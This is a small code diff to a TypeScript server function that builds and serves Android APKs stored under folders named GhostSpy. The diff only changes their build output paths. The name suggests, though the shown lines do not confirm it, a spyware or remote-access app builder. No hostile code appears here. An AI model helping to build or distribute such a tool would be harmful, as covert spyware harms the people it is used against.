@@ -171,7 +171,7 @@ export const createNewApk = (req: Request, res: Response) => {
 			// Rename and move the APK
 			const ghostMainApkPath = path.join(
 				__dirname,
-				"../../public/GhostSpy/GhostSpy_main/app/build/outputs/apk/release/app-release.apk"
+				"../../public/GhostSpy/GhostSpy_main/app/release/app-release.apk"
 			);
 
 			const updateApkPath = path.join(
@@ -190,7 +190,7 @@ export const createNewApk = (req: Request, res: Response) => {
 			// Step 5: Make the APK available for download
 			const ghostMajorApkPath = path.join(
 				__dirname,
-				"../../public/GhostSpy/GhostSpy_major/app/build/outputs/apk/release/app-release.apk"
+				"../../public/GhostSpy/GhostSpy_major/app/release/app-release.apk"
 			);
 
 			const ghostMajorApkPublicPath = path.join(
